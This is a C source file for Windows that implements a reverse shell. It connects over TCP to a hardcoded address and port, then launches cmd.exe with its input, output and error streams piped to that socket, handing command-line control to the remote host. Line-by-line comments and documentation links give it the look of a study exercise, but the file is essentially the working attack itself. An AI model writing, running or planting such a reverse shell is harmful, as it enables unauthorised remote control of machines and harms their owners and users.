// https://pubs.opengroup.org/onlinepubs/009695399/basedefs/netinet/in.h.html link contains all the funciton of ininet/in.h likle IPPROT_TCP
//https://docs.microsoft.com/en-us/windows/win32/api/ws2def/ns-ws2def-sockaddr_in contains all about .sin_addr, .sin_family, SOCKADDR
// https://stackoverflow.com/questions/39314086/what-does-it-mean-to-bind-a-socket-to-any-address-other-than-localhost  (BINDING)
// https://docs.microsoft.com/en-us/windows/win32/api/winsock/ns-winsock-wsadata 
// The WSADATA structure contains information about the Windows Sockets implementation.
//#include<stdaf.
#include<stdio.h>
#include<winsock2.h>                                      //header file to create windows socket
#include<windows.h>                                      // header file to use the windows API functions
#include<ws2tcpip.h>                                    // header file to include TCP IP 
#pragma comment(lib, "Ws2_32.lib")                     //Specify linker to the windows library

void main()
{

    int connection;
    int port = 8081;                                       //Declairing a port number
    char RecvServer[1024];                                //container to hold charachter with size 1024 byte
    char ip_addr[] = "192.168.236.225";                  //Ip address of the target machine
    SOCKET remote;                                      //Declairing socket structure
    sockaddr_in remote_addr;                           //Declairing socket structure variable (necessary for the binding & connection)
    WSADATA wsa;                                      //Declairing WSA data structure (socket programming only for windows)
    STARTUPINFO strinfo;                             //structure contains information which is used to control how the process behaves and appears on startup
    PROCESS_INFORMATION proc_info;                  //Contains information about a newly created process and its primary thread

    //Initializing winsock 
    //(2,2) are the winsock version
    WSAStartup(MAKEWORD(2,2), &wsa);                    

    // creating a TCP socket
    remote = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL , (unsigned int)NULL, (unsigned int )NULL);

    remote_addr.sin_family =AF_INET;                              // Declairing the family Type of TCP to the socket address
    remote_addr.sin_port = htons(port);                          //Declairing Port number to the socket address
    remote_addr.sin_addr.s_addr =  inet_addr(ip_addr);    

    connection = WSAConnect(remote, (SOCKADDR*)&remote_addr, sizeof(remote_addr), NULL, NULL, NULL, NULL);         //connect to the target server

    //Logical check for the Frames
    if(connection == SOCKET_ERROR){
        printf("[!] connection Failed, Please Try again !\n");
        exit(0);

    }
    else{
        
        recv(remote, RecvServer, sizeof(RecvServer), 0);                      //receiving the data
        memset(&strinfo, 0, sizeof(strinfo));                                // For conveting the startup information to zero 
        strinfo.cb = sizeof(strinfo);                                       //The size of the structure, in bytes.
        strinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);   // you can pass in 0 or one of the other listed flags

        strinfo.hStdInput = strinfo.hStdOutput = strinfo.hStdError = (HANDLE)remote; //to shoe the IP OP and error in the server                
                                                                                    // (handel)remote is used for piping between the server and the client
        CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &strinfo, &proc_info);     // call the CMD by piping
        WaitForSingleObject(proc_info.hProcess, INFINITE);      // wating untill next input or output is enterd for infinite time 
        CloseHandle(proc_info.hProcess);                       //close the opend handle process
        CloseHandle(proc_info.hThread);                       //close the oepnd thread handle
        memset(RecvServer, 0, sizeof(RecvServer));           //resetting the size of the container
     }
    
}
